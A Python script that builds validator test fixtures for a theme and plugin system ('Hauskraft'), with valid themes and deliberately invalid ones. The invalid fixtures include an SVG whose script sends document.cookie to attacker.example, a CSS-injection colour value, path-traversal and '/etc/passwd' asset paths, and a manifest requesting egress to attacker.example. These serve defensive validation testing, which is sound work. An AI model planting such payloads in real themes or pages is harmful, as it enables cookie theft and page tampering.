# SPDX-License-Identifier: MIT
"""Regenerate the acceptance-suite fixtures.

    python -m venv .venv && .venv/bin/pip install -r tests/fixtures/_generators/requirements.txt
    .venv/bin/python tests/fixtures/_generators/make_fixtures.py

Outputs are committed. The script checks its own colour palettes with the suite's
independent WCAG/OKLab maths, so a "valid" fixture is provably valid and each "invalid"
fixture breaks exactly the rule it is named after.
"""

from __future__ import annotations

import copy
import json
import shutil
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / "tests"))

from _support import colour  # noqa: E402
from _support.theme_contract import (  # noqa: E402
    COLOUR_TOKENS, DESTRUCTIVE_PRIMARY_MIN_OKLAB, NON_TEXT_MIN, NON_TEXT_PAIRS, TEXT_MIN, TEXT_PAIRS,
)

FIX = ROOT / "tests" / "fixtures"
THEMES = FIX / "themes"

# --------------------------------------------------------------------------- palettes
LIGHT = {
    "background": "#ffffff", "foreground": "#111827",
    "surface": "#f8fafc", "surface-foreground": "#111827",
    "muted": "#f1f5f9", "muted-foreground": "#475569",
    "border": "#64748b", "input": "#64748b", "ring": "#1d4ed8", "overlay": "#0f172acc",
    "primary": "#1d4ed8", "primary-foreground": "#ffffff",
    "secondary": "#e2e8f0", "secondary-foreground": "#0f172a",
    "accent": {"colorSpace": "srgb", "components": [0.427, 0.157, 0.851], "alpha": 1},
    "accent-foreground": "#ffffff",
    "destructive": "#b91c1c", "destructive-foreground": "#ffffff",
    "success": "#15803d", "success-foreground": "#ffffff",
    "warning": "#fbbf24", "warning-foreground": "#111827",
    "info": "#0369a1", "info-foreground": "#ffffff",
    "nav-background": "#f1f5f9", "nav-foreground": "#0f172a",
    "nav-active": "#1d4ed8", "nav-active-foreground": "#ffffff",
    "widget-background": "#ffffff", "widget-foreground": "#111827", "widget-border": "#64748b",
    "chart-1": "#1d4ed8", "chart-2": "#15803d", "chart-3": "#b45309",
    "chart-4": "#7c3aed", "chart-5": "#be123c", "chart-6": "#0e7490",
}
DARK = {
    "background": "#0b1120", "foreground": "#e5e7eb",
    "surface": "#111827", "surface-foreground": "#e5e7eb",
    "muted": "#1f2937", "muted-foreground": "#9ca3af",
    "border": "#6b7280", "input": "#6b7280", "ring": "#60a5fa", "overlay": "#000000cc",
    "primary": "#60a5fa", "primary-foreground": "#0b1120",
    "secondary": "#1f2937", "secondary-foreground": "#e5e7eb",
    "accent": "#a78bfa", "accent-foreground": "#0b1120",
    "destructive": "#f87171", "destructive-foreground": "#0b1120",
    "success": "#4ade80", "success-foreground": "#0b1120",
    "warning": "#fbbf24", "warning-foreground": "#0b1120",
    "info": "#38bdf8", "info-foreground": "#0b1120",
    "nav-background": "#111827", "nav-foreground": "#e5e7eb",
    "nav-active": "#60a5fa", "nav-active-foreground": "#0b1120",
    "widget-background": "#111827", "widget-foreground": "#e5e7eb", "widget-border": "#6b7280",
    "chart-1": "#60a5fa", "chart-2": "#4ade80", "chart-3": "#fbbf24",
    "chart-4": "#a78bfa", "chart-5": "#fb7185", "chart-6": "#22d3ee",
}


def dim(value: float, unit: str) -> dict:
    return {"value": value, "unit": unit}


def shadow(y: int, blur: int, alpha_hex: str) -> dict:
    return {"color": f"#000000{alpha_hex}", "offsetX": dim(0, "px"), "offsetY": dim(y, "px"),
            "blur": dim(blur, "px"), "spread": dim(0, "px")}


def token_tree(palette: dict, dimension_shorthand: bool) -> dict:
    """Build a DTCG 2025.10 token tree. Dark files use CSS-string shorthand for dimensions."""
    d = (lambda v, u: f"{v}{u}") if dimension_shorthand else dim
    tree: dict = {"color": {"$type": "color"}}
    for name in COLOUR_TOKENS:
        tree["color"][name.split(".", 1)[1]] = {"$value": palette[name.split(".", 1)[1]]}
    tree["font"] = {"$type": "fontFamily",
                    "sans": {"$value": ["Fixture Sans", "system-ui", "sans-serif"]},
                    "heading": {"$value": "{font.sans}"},
                    "mono": {"$value": ["ui-monospace", "monospace"]}}
    sizes = {"xs": 0.75, "sm": 0.875, "base": 1, "lg": 1.125, "xl": 1.25, "2xl": 1.5, "3xl": 1.875}
    tree["font-size"] = {"$type": "dimension", **{k: {"$value": d(v, "rem")} for k, v in sizes.items()}}
    tree["font-weight"] = {"$type": "fontWeight", "regular": {"$value": 400},
                           "medium": {"$value": 500}, "bold": {"$value": 700}}
    tree["line-height"] = {"$type": "number", "tight": {"$value": 1.2}, "normal": {"$value": 1.5}}
    tree["radius"] = {"$type": "dimension", "sm": {"$value": d(2, "px")}, "md": {"$value": d(4, "px")},
                      "lg": {"$value": d(8, "px")}, "xl": {"$value": d(12, "px")},
                      "full": {"$value": d(9999, "px")}}
    tree["space"] = {"$type": "dimension", "unit": {"$value": d(4, "px")}}
    tree["shadow"] = {"$type": "shadow", "sm": {"$value": shadow(1, 2, "1a")},
                      "md": {"$value": shadow(2, 6, "26")}, "lg": {"$value": shadow(8, 24, "33")}}
    tree["duration"] = {"$type": "duration", "fast": {"$value": dim(120, "ms")},
                        "normal": {"$value": dim(200, "ms")}}
    tree["easing"] = {"$type": "cubicBezier", "standard": {"$value": [0.2, 0, 0, 1]}}
    return tree


def check_palette(p: dict, label: str) -> None:
    for fg, bg in TEXT_PAIRS:
        c = colour.contrast(p[fg.split(".", 1)[1]], p[bg.split(".", 1)[1]])
        assert c >= TEXT_MIN, f"{label}: {fg} on {bg} = {c:.2f}"
    for fg, bg in NON_TEXT_PAIRS:
        c = colour.contrast(p[fg.split(".", 1)[1]], p[bg.split(".", 1)[1]])
        assert c >= NON_TEXT_MIN, f"{label}: {fg} on {bg} = {c:.2f}"
    dist = colour.oklab_distance(p["destructive"], p["primary"])
    assert dist >= DESTRUCTIVE_PRIMARY_MIN_OKLAB, f"{label}: destructive vs primary {dist:.3f}"


# --------------------------------------------------------------------------- binary assets
def make_font(path: Path) -> None:
    """A tiny, genuinely valid WOFF2 font ("Fixture Sans") owned by the project (MIT)."""
    from fontTools.fontBuilder import FontBuilder
    from fontTools.pens.ttGlyphPen import TTGlyphPen

    def box() -> object:
        pen = TTGlyphPen(None)
        pen.moveTo((100, 0)); pen.lineTo((100, 700)); pen.lineTo((500, 700)); pen.lineTo((500, 0))
        pen.closePath()
        return pen.glyph()

    fb = FontBuilder(1000, isTTF=True)
    fb.setupGlyphOrder([".notdef", "space", "A"])
    fb.setupCharacterMap({0x20: "space", 0x41: "A"})
    empty = TTGlyphPen(None).glyph()
    fb.setupGlyf({".notdef": box(), "space": empty, "A": box()})
    fb.setupHorizontalMetrics({".notdef": (600, 100), "space": (300, 0), "A": (600, 100)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupNameTable({"familyName": "Fixture Sans", "styleName": "Regular"})
    fb.setupOS2(sTypoAscender=800, usWinAscent=800, usWinDescent=200)
    fb.setupPost()
    fb.font.flavor = "woff2"
    path.parent.mkdir(parents=True, exist_ok=True)
    fb.save(str(path))


SPRITE_OK = """<svg xmlns="http://www.w3.org/2000/svg">
  <symbol id="nav.today" viewBox="0 0 24 24"><rect x="4" y="5" width="16" height="15" rx="2" fill="none" stroke="currentColor" stroke-width="2"/></symbol>
  <symbol id="action.add" viewBox="0 0 24 24"><path d="M12 5v14M5 12h14" stroke="currentColor" stroke-width="2"/></symbol>
</svg>
"""
SPRITE_SCRIPT = """<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.example/?c=' + document.cookie)</script>
  <symbol id="nav.today" viewBox="0 0 24 24" onload="alert(1)"><rect x="4" y="5" width="16" height="15"/></symbol>
</svg>
"""
MIT_FIXTURE = """MIT License

Copyright (c) 2026 Hauskraft contributors

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
associated documentation files (the "Software"), to deal in the Software without restriction,
including without limitation the rights to use, copy, modify, merge, publish, distribute,
sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or
substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT
NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES
OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""


# --------------------------------------------------------------------------- theme packages
def manifest(name: str) -> dict:
    return {
        "$schema": "../../../../packages/schemas/manifest/hauskraft.plugin.schema.json",
        "id": f"org.example.theme.{name}",
        "name": name.replace("-", " ").title(),
        "version": "0.1.0",
        "type": ["theme"],
        "hauskraft_api": "^0.1.0",
        "license": "MIT",
        "authors": [{"name": "Hauskraft test fixtures"}],
        "source": f"https://github.com/hzmchen/hauskraft/tree/main/tests/fixtures/themes/{name}",
        "runtime": {"kind": "declarative"},
        "capabilities": [],
        "data_classes": {"reads": [], "writes": [], "emits": []},
        "contributes": {"themes": [{"id": name, "file": "theme.json"}]},
    }


def theme_json(name: str) -> dict:
    return {
        "$schema": "../../../../packages/schemas/theme/hauskraft.theme.schema.json",
        "theme_api": "1.0",
        "name": name.replace("-", " ").title(),
        "description": "Acceptance-suite fixture. See tests/fixtures/README.md.",
        "tokens": {"light": "tokens.light.json", "dark": "tokens.dark.json"},
        "fonts": [{"family": "Fixture Sans", "src": "assets/fonts/FixtureSans.woff2",
                   "weight": "400", "style": "normal"}],
        "components": {"widget": {"chrome": "outlined", "header": "inline"},
                       "button": {"primary": "solid"}, "checkbox": {"style": "square"}},
        "layout": {"navigation": {"wide": "sidebar", "narrow": "drawer"},
                   "density": "comfortable", "content_width": "full"},
        "preview": {"swatches": ["{color.primary}", "{color.accent}", "{color.background}"]},
    }


def write_json(path: Path, data: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")


def write_theme(name: str, *, light: dict | None = None, dark: dict | None = None, mutate=None,
                font: bool = True, licences: bool = True, sprite: str | None = None,
                font_bytes: bytes | None = None, man: dict | None = None) -> Path:
    folder = THEMES / name
    if folder.exists():
        shutil.rmtree(folder)
    lt = token_tree(light or LIGHT, dimension_shorthand=False)
    dk = token_tree(dark or DARK, dimension_shorthand=True)
    tj = theme_json(name)
    mf = man or manifest(name)
    if sprite is not None:
        tj["icons"] = {"pack": "assets/icons/sprite.svg", "fallback": "default"}
        (folder / "assets" / "icons").mkdir(parents=True, exist_ok=True)
        (folder / "assets" / "icons" / "sprite.svg").write_text(sprite, encoding="utf-8")
    if mutate:
        mutate(lt=lt, dk=dk, tj=tj, mf=mf)
    write_json(folder / "hauskraft.plugin.json", mf)
    write_json(folder / "theme.json", tj)
    write_json(folder / "tokens.light.json", lt)
    write_json(folder / "tokens.dark.json", dk)
    if font:
        font_path = folder / "assets" / "fonts" / "FixtureSans.woff2"
        font_path.parent.mkdir(parents=True, exist_ok=True)
        if font_bytes is not None:
            font_path.write_bytes(font_bytes)
        else:
            shutil.copy(FONT_SRC, font_path)
    (folder / "LICENSE").write_text(MIT_FIXTURE, encoding="utf-8")
    if licences:
        (folder / "LICENSES").mkdir(exist_ok=True)
        (folder / "LICENSES" / "MIT.txt").write_text(MIT_FIXTURE, encoding="utf-8")
    return folder


FONT_SRC = FIX / "_generators" / "build" / "FixtureSans.woff2"

# expected outcome per fixture: (valid, error codes, warning codes)
EXPECTED: dict[str, dict] = {}


def expect(name: str, valid: bool, errors: list[str] | None = None, warnings: list[str] | None = None,
           note: str = "") -> None:
    EXPECTED[name] = {"id": f"org.example.theme.{name}", "valid": valid, "errors": errors or [],
                      "warnings": warnings or [], "note": note}


def build_themes() -> None:
    check_palette(LIGHT, "valid light")
    check_palette(DARK, "valid dark")
    make_font(FONT_SRC)
    if THEMES.exists():
        shutil.rmtree(THEMES)

    write_theme("valid-minimal")
    expect("valid-minimal", True, note="Passes every rule with zero warnings (also with --strict).")

    write_theme("warn-partial-icons", sprite=SPRITE_OK)
    expect("warn-partial-icons", True, warnings=["icons.partial"], note="Sprite covers 2 of 17 core names.")

    def no_preview(tj, **_):
        del tj["preview"]
    write_theme("warn-no-preview", mutate=no_preview)
    expect("warn-no-preview", True, warnings=["preview.missing"])

    write_theme("warn-no-licence", licences=False)
    expect("warn-no-licence", True, warnings=["licence.missing"], note="Bundled font without LICENSES/.")

    low = dict(LIGHT, **{"muted-foreground": "#cbd5e1"})
    assert colour.contrast(low["muted-foreground"], low["background"]) < TEXT_MIN
    write_theme("invalid-low-contrast", light=low)
    expect("invalid-low-contrast", False, ["contrast.text"],
           note="Light muted-foreground on background is about 1.5:1.")

    faint = dict(DARK, border="#1f2937")
    assert colour.contrast(faint["border"], faint["background"]) < NON_TEXT_MIN
    write_theme("invalid-border-contrast", dark=faint)
    expect("invalid-border-contrast", False, ["contrast.non_text"], note="Dark border nearly invisible.")

    def drop_ring(dk, **_):
        del dk["color"]["ring"]
    write_theme("invalid-missing-token", mutate=drop_ring)
    expect("invalid-missing-token", False, ["token.missing"], note="Dark mode lacks color.ring.")

    def inject(lt, **_):
        lt["color"]["primary"]["$value"] = "red; } body { display:none } :root {"
    write_theme("invalid-css-injection", mutate=inject)
    expect("invalid-css-injection", False, ["token.invalid_value"],
           note="A colour value that tries to break out of its CSS declaration.")

    def cycle(lt, **_):
        lt["color"]["secondary"]["$value"] = "{color.accent}"
        lt["color"]["accent"]["$value"] = "{color.secondary}"
    write_theme("invalid-alias-cycle", mutate=cycle)
    expect("invalid-alias-cycle", False, ["token.alias_cycle"])

    near = dict(LIGHT, destructive="#1e40af")
    assert colour.oklab_distance(near["destructive"], near["primary"]) < DESTRUCTIVE_PRIMARY_MIN_OKLAB
    assert colour.contrast(near["destructive-foreground"], near["destructive"]) >= TEXT_MIN
    write_theme("invalid-destructive-like-primary", light=near)
    expect("invalid-destructive-like-primary", False, ["distinct.destructive_primary"],
           note="Delete would look like Save.")

    def css_key(tj, **_):
        tj["components"]["widget"]["css"] = "body { display: none }"
    write_theme("invalid-schema-css-key", mutate=css_key)
    expect("invalid-schema-css-key", False, ["schema.invalid"], note="Raw CSS is never accepted.")

    def external_font(tj, **_):
        tj["fonts"][0]["src"] = "https://fonts.example.com/tracker.woff2"
    write_theme("invalid-external-font", mutate=external_font)
    expect("invalid-external-font", False, ["schema.invalid"], note="Remote assets are tracking beacons.")

    def traversal(tj, **_):
        tj["fonts"][0]["src"] = "../valid-minimal/assets/fonts/FixtureSans.woff2"
    write_theme("invalid-path-traversal", mutate=traversal)
    expect("invalid-path-traversal", False, ["schema.invalid"])

    write_theme("invalid-bad-font-magic", font_bytes=b"<html>not a font</html>" + b"\0" * 64)
    expect("invalid-bad-font-magic", False, ["asset.type"], note="File named .woff2 without wOF2 magic.")

    write_theme("invalid-svg-script", sprite=SPRITE_SCRIPT)
    expect("invalid-svg-script", False, ["svg.unsafe"])

    def capabilities(mf, **_):
        mf["capabilities"] = ["net:egress:attacker.example"]
    write_theme("invalid-manifest-capabilities", mutate=capabilities)
    expect("invalid-manifest-capabilities", False, ["manifest.invalid"],
           note="Theme plugins may not request capabilities.")

    write_json(THEMES / "expected.json", {
        "$comment": "Expected `hauskraft themes validate --json` outcome per fixture. Each invalid fixture "
                    "must report at least the listed error codes; valid ones must report no errors and "
                    "exactly the listed warning codes.",
        "themes": EXPECTED,
    })


# --------------------------------------------------------------------------- JSON fixtures
TASKS_MANIFEST = {
    "$schema": "../../../../packages/schemas/manifest/hauskraft.plugin.schema.json",
    "id": "dev.hauskraft.tasks", "name": "Tasks", "version": "0.1.0", "type": ["domain", "widget"],
    "hauskraft_api": "^0.1.0", "license": "MIT", "authors": [{"name": "Hauskraft contributors"}],
    "source": "https://github.com/hzmchen/hauskraft/tree/main/plugins/official/tasks",
    "runtime": {"kind": "inprocess", "entrypoint": "hauskraft_tasks.plugin:plugin", "api_prefix": "/tasks",
                "migrations": "backend/migrations/versions", "web": "@hauskraft/plugin-tasks"},
    "capabilities": ["graph:read:Task", "graph:write:Task", "events:emit:hauskraft.task.*"],
    "data_classes": {"reads": ["household"], "writes": ["household"], "emits": ["household"]},
    "config_schema": {"type": "object", "properties": {}, "additionalProperties": False},
    "contributes": {
        "widgets": [{"id": "tasks.list", "title": "i18n:tasks:widget.title", "component": "TasksWidget",
                     "default_size": {"w": 4, "h": 6}, "min_size": {"w": 3, "h": 4}}],
        "pages": [{"id": "tasks", "title": "i18n:tasks:page.title", "component": "TasksPage", "nav": True,
                   "icon": "nav.tasks", "nav_order": 20}],
        "entities": [{"type": "Task", "data_class": "household"}],
        "icons": [], "tools": [], "settings": [], "commands": [], "themes": [],
    },
    "subscribes": [],
}

PAPERLESS_MANIFEST = {
    "$schema": "../../../../packages/schemas/manifest/hauskraft.plugin.schema.json",
    "id": "dev.hauskraft.connector.paperless", "name": "Paperless-ngx", "version": "0.3.0",
    "type": ["connector", "widget"], "hauskraft_api": ">=1.0 <2.0", "license": "MIT",
    "authors": [{"name": "Hauskraft contributors"}],
    "source": "https://github.com/hzmchen/plugin-paperless",
    "runtime": {"kind": "container", "image": "ghcr.io/hauskraft/plugin-paperless", "digest": "sha256:" + "0" * 64},
    "config_schema": {"type": "object", "required": ["base_url"],
                      "properties": {"base_url": {"type": "string", "format": "uri"}}},
    "secrets": ["paperless_api_token"],
    "capabilities": ["net:egress:paperless.lan:8000", "graph:write:Document", "graph:read:Property",
                     "llm:invoke:financial", "notify:inbox"],
    "data_classes": {"reads": ["financial", "tenant", "health"], "writes": ["financial"],
                     "emits": ["financial", "tenant", "health"]},
    "subscribes": ["hauskraft.deadline.created"],
    "contributes": {
        "tools": [{"name": "paperless.search", "annotations": {"read_only": True, "open_world": False}},
                  {"name": "paperless.tag_document",
                   "annotations": {"read_only": False, "destructive": False, "idempotent": True},
                   "verify": {"tool": "paperless.get_document", "assert": "$.tags[*] contains input.tag"}}],
        "widgets": [{"id": "inbox", "title": "Document inbox", "resource": "ui://paperless/inbox",
                     "default_size": {"w": 4, "h": 4}, "roles": ["owner", "adult"]}],
        "entities": [{"type": "Document", "jsonld": "https://schema.org/DigitalDocument"}],
    },
}


def build_manifests() -> None:
    base = FIX / "manifests"
    if base.exists():
        shutil.rmtree(base)
    write_json(base / "valid" / "tasks.json", TASKS_MANIFEST)
    write_json(base / "valid" / "connector-paperless.json", PAPERLESS_MANIFEST)
    write_json(base / "valid" / "theme.json", manifest("valid-minimal"))

    def bad(name: str, why: str, change) -> None:
        m = copy.deepcopy(TASKS_MANIFEST if not name.startswith("theme-") else manifest("bad"))
        change(m)
        m["$comment"] = why
        write_json(base / "invalid" / f"{name}.json", m)

    bad("id-not-reverse-dns", "id must be reverse-DNS", lambda m: m.update(id="Tasks"))
    bad("version-not-semver", "version must be SemVer", lambda m: m.update(version="1.0"))
    bad("unknown-type", "type must be from the fixed list", lambda m: m.update(type=["gadget"]))
    bad("unknown-runtime", "runtime.kind must be from the fixed list", lambda m: m["runtime"].update(kind="docker"))
    bad("bad-capability", "capabilities are scoped strings", lambda m: m.update(capabilities=["graph write Task"]))
    bad("bad-data-class", "data classes come from the ordered enum",
        lambda m: m["data_classes"].update(reads=["private"]))
    bad("missing-license", "license is required", lambda m: m.pop("license"))
    bad("bad-icon-name", "page icons are semantic icon names", lambda m: m["contributes"]["pages"][0].update(icon="List Checks"))
    bad("theme-with-capabilities", "theme plugins declare no capabilities",
        lambda m: m.update(capabilities=["net:egress:attacker.example"]))
    bad("theme-inprocess-runtime", "theme plugins are declarative only",
        lambda m: m["runtime"].update(kind="inprocess", entrypoint="evil:plugin"))
    bad("theme-with-widgets", "theme plugins cannot contribute widgets",
        lambda m: m["contributes"].update(widgets=[{"id": "x", "title": "X", "component": "X"}]))
    bad("theme-without-themes", "theme plugins must contribute at least one theme",
        lambda m: m["contributes"].update(themes=[]))
    bad("theme-with-data-classes", "theme plugins declare no data classes",
        lambda m: m["data_classes"].update(reads=["household"]))


EVENT_BASE = {
    "specversion": "1.0",
    "id": "0199f3a2-6c1e-7b8a-9d40-2f6c1a0b7e11",
    "source": "dev.hauskraft.tasks",
    "type": "hauskraft.task.created",
    "subject": "task/0199f3a2-6c1d-7c55-8a10-3e2b9f4c0d21",
    "time": "2026-10-12T09:15:02.481Z",
    "datacontenttype": "application/json",
    "dataschema": "https://hauskraft.dev/schema/events/task.created/v1.json",
    "dataclass": "household",
    "actorid": "0199f390-1111-7aaa-8bbb-cccccccccccc",
}
TASK = {"id": "0199f3a2-6c1d-7c55-8a10-3e2b9f4c0d21", "title": "Buy milk", "done": False,
        "due_on": None, "version": 1}


def event(type_: str, data: dict, source: str = "dev.hauskraft.tasks", subject: str | None = None) -> dict:
    e = dict(EVENT_BASE, type=f"hauskraft.{type_}", data=data, source=source,
             dataschema=f"https://hauskraft.dev/schema/events/{type_}/v1.json")
    if subject is not None:
        e["subject"] = subject
    return e


def build_events() -> None:
    base = FIX / "events"
    if base.exists():
        shutil.rmtree(base)
    done = dict(TASK, done=True, version=3, title="Buy oat milk", due_on="2026-10-13")
    write_json(base / "valid" / "task.created.json", event("task.created", {"task": TASK}))
    write_json(base / "valid" / "task.updated.json", event("task.updated", {
        "task": dict(TASK, title="Buy oat milk", due_on="2026-10-13", version=2),
        "changes": {"title": ["Buy milk", "Buy oat milk"], "due_on": [None, "2026-10-13"]}}))
    write_json(base / "valid" / "task.updated-reopen.json", event("task.updated", {
        "task": dict(done, done=False, version=4), "changes": {"done": [True, False]}}))
    write_json(base / "valid" / "task.completed.json", event("task.completed", {
        "task": done, "completed_at": "2026-10-12T09:20:00Z"}))
    write_json(base / "valid" / "task.deleted.json", event("task.deleted", {"task": done}))
    write_json(base / "valid" / "settings.theme_changed.json", event(
        "settings.theme_changed", {"from": "dev.hauskraft.theme.default", "to": "dev.hauskraft.theme.hackspace"},
        source="dev.hauskraft.core", subject="setting/theme_id"))
    write_json(base / "valid" / "plugin.toggled.json", event(
        "plugin.toggled", {"plugin_id": "dev.hauskraft.tasks", "enabled": True},
        source="dev.hauskraft.core", subject="plugin/dev.hauskraft.tasks"))

    def bad(name: str, why: str, change) -> None:
        e = event("task.created", {"task": TASK})
        change(e)
        e["$comment"] = why
        write_json(base / "invalid" / f"{name}.json", e)

    def underscore(e: dict) -> None:
        e["data_class"] = e.pop("dataclass")
    bad("underscore-attribute", "CloudEvents attribute names cannot contain underscores", underscore)
    bad("missing-dataclass", "dataclass is required", lambda e: e.pop("dataclass"))
    bad("unknown-dataclass", "dataclass comes from the ordered enum", lambda e: e.update(dataclass="private"))
    bad("missing-source", "source is required", lambda e: e.pop("source"))
    bad("wrong-specversion", "specversion must be 1.0", lambda e: e.update(specversion="0.3"))


def build_theme_json() -> None:
    base = FIX / "theme-json"
    if base.exists():
        shutil.rmtree(base)
    hack = {
        "$schema": "https://hauskraft.dev/schema/theme/1.0.json", "theme_api": "1.0", "name": "Hackspace",
        "description": "Basement hackerspace look: near-black, phosphor green, monospace, pixel icons.",
        "tokens": {"light": "tokens.light.json", "dark": "tokens.dark.json"},
        "fonts": [{"family": "JetBrains Mono", "src": "assets/fonts/JetBrainsMono-Variable.woff2",
                   "weight": "100 800", "style": "normal"},
                  {"family": "VT323", "src": "assets/fonts/VT323-Regular.woff2", "weight": "400", "style": "normal"}],
        "components": {"widget": {"chrome": "tinted", "header": "banner"}, "button": {"primary": "solid"},
                       "checkbox": {"style": "square"}},
        "layout": {"navigation": {"wide": "topbar", "narrow": "bottom-tabs"}, "density": "compact",
                   "content_width": "contained"},
        "icons": {"pack": "assets/icons/sprite.svg", "fallback": "default"},
        "background": {"light": {"color": "{color.background}"}, "dark": {"image": "assets/images/grid-dark.webp"}},
        "preview": {"swatches": ["{color.primary}", "{color.accent}", "{color.background}"]},
    }
    write_json(base / "valid" / "hackspace.json", hack)
    write_json(base / "valid" / "minimal.json", theme_json("valid-minimal"))

    def bad(name: str, why: str, change) -> None:
        t = copy.deepcopy(hack)
        change(t)
        t["$comment"] = why
        write_json(base / "invalid" / f"{name}.json", t)

    bad("unknown-root-key", "unknown keys are rejected", lambda t: t.update(colour_scheme="dark"))
    bad("unknown-density", "density is a fixed enum", lambda t: t["layout"].update(density="huge"))
    bad("unknown-nav-style", "navigation styles are a fixed enum",
        lambda t: t["layout"]["navigation"].update(wide="floating"))
    bad("unknown-chrome", "widget chrome is a fixed enum", lambda t: t["components"]["widget"].update(chrome="glass"))
    bad("css-key-nested", "no css keys anywhere", lambda t: t["components"]["widget"].update(css="body{}"))
    bad("script-key-root", "no script keys anywhere", lambda t: t.update(script="alert(1)"))
    bad("style-key-background", "no style keys anywhere",
        lambda t: t["background"]["dark"].update(style="background:url(https://x)"))
    bad("absolute-asset-path", "asset paths are relative", lambda t: t["fonts"][0].update(src="/etc/passwd"))
    bad("url-asset-path", "no URL schemes in asset paths",
        lambda t: t["fonts"][0].update(src="https://fonts.example.com/f.woff2"))
    bad("data-url-asset-path", "no data: URLs in asset paths",
        lambda t: t["background"]["dark"].update(image="data:image/png;base64,AAAA"))
    bad("dotdot-asset-path", "no '..' in asset paths", lambda t: t["icons"].update(pack="../other/sprite.svg"))
    bad("missing-dark-tokens", "both token files are required", lambda t: t["tokens"].pop("dark"))
    bad("missing-layout", "layout is required", lambda t: t.pop("layout"))


def main() -> None:
    build_themes()
    build_manifests()
    build_events()
    build_theme_json()
    shutil.rmtree(FIX / "_generators" / "build", ignore_errors=True)
    print("fixtures written to", FIX.relative_to(ROOT))


if __name__ == "__main__":
    main()
